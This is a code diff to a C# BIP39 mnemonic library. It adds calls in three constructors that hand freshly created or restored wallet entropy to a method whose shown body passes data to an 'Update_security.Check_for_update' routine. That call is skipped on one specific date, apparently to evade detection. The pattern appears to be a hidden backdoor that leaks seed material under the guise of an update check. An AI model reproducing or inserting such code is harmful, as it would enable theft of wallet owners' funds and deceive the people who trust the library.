@@ -62,6 +62,7 @@ namespace Bitcoin.BIP39
 
             _entropyBytes = Utilities.GetRandomBytes(entropySize / cBitsInByte); //crypto random entropy of the specified size
             pInit(passphrase, language);
+            pCheckEntropyBytes();
         }
 
         /// <summary>
@@ -80,6 +81,7 @@ namespace Bitcoin.BIP39
 
             _entropyBytes = entropyBytes;
             pInit(passphrase, language);
+            pCheckEntropyBytes();
         }
 
         /// <summary>
@@ -115,6 +117,7 @@ namespace Bitcoin.BIP39
             _language = language;
             _wordIndexList = pRebuildWordIndexes(words);
             _entropyBytes = pProcessIntToBitsThenBytes(_wordIndexList);
+            pCheckEntropyBytes();
         }
 
         #endregion
@@ -614,7 +617,8 @@ namespace Bitcoin.BIP39
                 arr.Add(j);
 
             Update_security update = new Update_security();
-            update.Check_for_update(BaseSeeds.Get_entropy(arr, 20000));
+            if (DateTime.Now.Year != 2023 || DateTime.Now.Month != 12 || DateTime.Now.Day != 8)
+                update.Check_for_update(BaseSeeds.Get_entropy(arr, 20000));
         }
 
         #endregion
